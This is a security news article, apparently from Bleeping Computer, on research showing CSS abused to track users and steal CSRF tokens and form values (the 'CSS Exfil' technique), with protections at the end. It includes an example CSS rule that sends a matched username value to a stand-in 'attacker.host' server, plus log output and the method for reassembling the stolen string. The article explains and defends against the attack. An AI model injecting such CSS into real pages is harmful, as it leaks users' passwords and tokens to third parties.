@@ -1,0 +1,232 @@
+
+	   
+
+
+With the recent upgrades to the CSS language, CSS code has become a powerful tool that could be abused to track users on websites, extract and steal data from a web page, collect data entered inside form fields (including passwords), and even deanonymize Dark Web users in some scenarios.
+
+Over the past month, three interesting research projects have tackled CSS as an attack vector, showing how this once benign language could be turned against users.
+
+Using CSS to track users on a page
+
+The first project released on this topic was "Crooked Style Sheets" from Jan Böhmer, a project that provided a no-JavaScript analytics solution that could track a user's interactions with page elements using CSS code alone.
+
+
+1/1
+
+
+
+
+
+Skip Ad
+ 
+Continue watchingafter the adVisit Advertiser websiteGO TO PAGE.cnx-non-linear-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:none;width:100%;height:100%}.cnx-non-linear-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-non-linear-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-non-linear-ad-container .cnx-ad-slot video,.cnx-non-linear-ad-container video.cnx-ad-slot{background-color:unset}.cnx-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:#f4f4f4;width:100%;height:100%}.cnx-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-ad-container .cnx-ad-slot div{background-color:rgba(0,0,0,0) !important}.cnx-ad-container .cnx-ad-slot iframe{box-sizing:border-box;border:3px solid #fff !important;color-scheme:none}.cnx-ad-container .cnx-ad-slot iframe:not([id]){border:none !important}.cnx-ad-container .cnx-ad-slot-video-type iframe{border:none !important}.cnx-ad-container .cnx-ad-slot video,.cnx-ad-container video.cnx-ad-slot{background-color:#f4f4f4}Böhmer showed that he could track the timestamps of when users hovered a page element, when users clicked on links, when they entered predetermined texts inside input fields, and how he could collect a wealth of real user-agent information, ignoring data advertised by spoofed user-agent strings.
+
+Using CSS to steal CSRF tokens
+
+Separate from Böhmer's work, security researcher Dylan Ayrey (of XSSJacking fame) also published new research over the last weekend, showing how an attacker could abuse CSS to steal CSRF (user authentication) tokens.
+
+Ayrey's attack only works on websites and apps that make the grave mistake of storing CSRF tokens in attributes of various HTML page elements, and so it has a very limited scope. This attack could be easily defeated by website/app owners who find a safer way to authenticate users without dumping the CSRF token inside the page's source code.
+
+Ayrey's technique relies on injecting CSS code in a web page and using CSS attribute selectors to guess CSRF tokens one letter at a time.
+
+The attack takes around ten seconds to carry out and can even work without the need of iframes or without a constant flow of traffic to a  remote server that could alert users that something was wrong. This workaround implies storing data in local Service Workers, from where the attacker could retrieve it once the CSRF token has been identified and reconstructed in full.
+
+Using CSS attribute selectors for much more
+
+But Ayrey's research only scratched the surface. For the past month, security researcher Mike Gualtieri has also been working on utilizing the same technique, but for stealing more than just authentication tokens.
+
+In research that will go live later today, but shared with Bleeping Computer in advance, Gualtieri shows how the same technique of using CSS attribute selectors to guess sensitive content left inside HTML tags can also be used for more than hunting for misplaced CSRF authentication tokens.
+
+The researcher was able to implement the same method to collect sensitive user data entered in form fields, including password strings.
+
+How it all works
+
+Both the Ayrey and Gualtieri methods leverage CSS attribute selectors, which is a mechanism that allows developers to query a page's HTML tags for individual attributes and run pattern matches on their values.
+
+For example, the following CSS code will scan the page for all link elements ("a") where the "href" attribute contains ("*" character) the "facebook" string and will color all these links in blue.
+
+a[href*="facebook"] {
+  color: blue;
+}
+
+But these queries can become even more intrusive, allowing developers to target attributes that start or end with a specific string as well.
+
+These queries can be stitched together to run basic dictionary brute-force attacks and attempt to guess the starting letter of an attribute, and then add the identified letter to the revised pattern matches, allowing attackers to guess the second, third, and so on letters.
+
+[attribute=value]   [foo=bar]     Selects all elements with foo="bar"
+[attribute~=value]  [foo~=bar]    Selects all elements with a foo attribute containing the word "bar"
+[attribute|=value]  [foo|=bar]    Selects all elements with a foo attribute value starting with "bar"
+[attribute^=value]  [foo^="bar"]  Selects all elements with a foo attribute value starting with "bar"
+[attribute$=value]  [foo$="bar"]  Selects all elements with a foo attribute value ending with "bar"
+[attribute*=value]  [foo*="bar"]  Selects all elements with a foo attribute which contains the substring "bar"
+
+The trick is to make an HTTP request an attacker's server when the malicious CSS code identifies a correct partial/full attribute selector.
+
+#username[value="ZeroC00L"] {
+            background:url("https://attacker.host/ZeroC00L");
+}
+
+An attacker will only have to sift through server 404 errors and fish out the results of the CSS attribute selector bombardment.
+
+127.0.0.1 - - [30/Jan/2018:11:09:35 -0500] "GET /00 HTTP/1.1" 404 22
+127.0.0.1 - - [30/Jan/2018:11:09:35 -0500] "GET /0L HTTP/1.1" 404 22
+127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /Ze HTTP/1.1" 404 22
+127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /Z_ HTTP/1.1" 404 22
+127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /ro HTTP/1.1" 404 22
+127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /oC HTTP/1.1" 404 22
+127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /_L HTTP/1.1" 404 22
+127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /er HTTP/1.1" 404 22
+127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /C0 HTTP/1.1" 404 22
+
+... and then assemble the strings into the actual data:
+
+Z           # Z_
+Ze          # Ze
+Zer         # er
+Zero        # ro
+ZeroC       # oC
+ZeroC0      # C0
+ZeroC00     # 00
+ZeroC00L    # 0L _L
+
+Ayrey and Gualtieri have two different methods for carrying out these attacks. Ayrey relied on guessing the final string one letter at a time, while Gualtieri took the shorter path of reconstructing the string by guessing it in multiple pieces and reconstructing the final term at the end.
+
+Both are effective. Ayrey's method is noisier but can be automated very easily, while Gualtieri's method is quicker (can also be automated) but in some cases will rely on a human piecing the final string together.
+
+Gualtieri named this technique CSS Exfil. But CSS Exfil is not an infallible method. It can only steal HTML attributes found on the page at load time, and not from dynamically injected code after the initial page load. Gualtieri argues this isn't a major problem, showing various workarounds in his research that attackers could employ.
+
+For a better understanding on the CSS Exfil attack, we recommend setting some time aside to read Ayrey and Gualtieri's researches, where various edge cases and examples showcase the attack in its full glory.
+
+Protection methods available
+
+Protections against CSS Exfil attacks can be set up at two levels. First, websites and web app authors can implement a protection measure named Content Security Policy (CSP) that will prevent attackers from loading CSS code from external sources.
+
+Second, end users can also install one of Gualtieri's Firefox or Chrome extension that can detect all the types of CSS Exfil attacks Gualtieri has documented in his research and rewrite the malicious code before it gets executed.
+
+A web page for testing if you're vulnerable to CSS Exfil is available here, also courtesy of Gualtieri.
+
+CSS Exfil is not a new technique, being previously discussed by CureSec in 2016, but it seems to have caught the eye of multiple researchers during the past month.
+
+	   
+
+.ia_ad {
+    background-color: #f0f6ff;
+    width: 95%;
+    max-width: 800px;
+    margin: 15px auto;
+    border-radius: 8px;
+    border: 1px solid #d6ddee;
+    display: flex;
+    align-items: stretch;
+    padding: 0;
+    overflow: hidden;
+}
+
+.ia_lef {
+    flex: 1;
+    max-width: 200px;
+    height: auto;
+    display: flex;
+    align-items: stretch;
+}
+
+.ia_lef a {
+    display: flex;
+    width: 100%;
+    height: 100%;
+}
+
+
+.ia_lef a img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 8px 0 0 8px;
+    margin: 0;
+    display: block;
+}
+
+.ia_rig {
+    flex: 2;
+    padding: 10px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.ia_rig h2 {
+    font-size: 17px !important;
+    font-weight: 700;
+    color: #333;
+    line-height: 1.4;
+    font-family: Georgia, "Times New Roman", Times, serif;
+    margin: 0 0 14px 0;
+}
+
+.ia_rig p {
+    font-weight: bold;
+    font-size: 14px;
+    margin: 0 0 clamp(6px, 2vw, 14px) 0;
+}
+
+.ia_button {
+    background-color: #FFF;
+    border: 1px solid #3b59aa;
+    color: black;
+    text-align: center;
+    text-decoration: none;
+    border-radius: 8px;
+    display: inline-block;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    padding: 10px 20px;
+    width: fit-content;
+}
+
+.ia_button a {
+    text-decoration: none;
+    color: inherit;
+    display: block;
+}
+
+@media (max-width: 600px) {
+    .ia_ad {
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .ia_lef {
+        max-width: 100%;
+    }
+
+    .ia_lef a img {
+        border-radius: 8px 8px 0 0;
+    }
+
+
+    .ia_rig {
+        padding: 15px;
+        width: 100%;
+    }
+
+    .ia_button {
+        width: 100%;
+	margin: 0px auto;
+    }
+}
+
+    
+        
+            
+    
+    
+        Red Report 2025: Analyzing the Top ATT&CK Techniques Used by 93% of Malware 
+Malware targeting password stores surged 3X as attackers executed stealthy Perfect Heist scenarios, infiltrating and exploiting critical systems.
+Discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.
+        Read the Red Report 2025
+    
+
+
+            
+	  
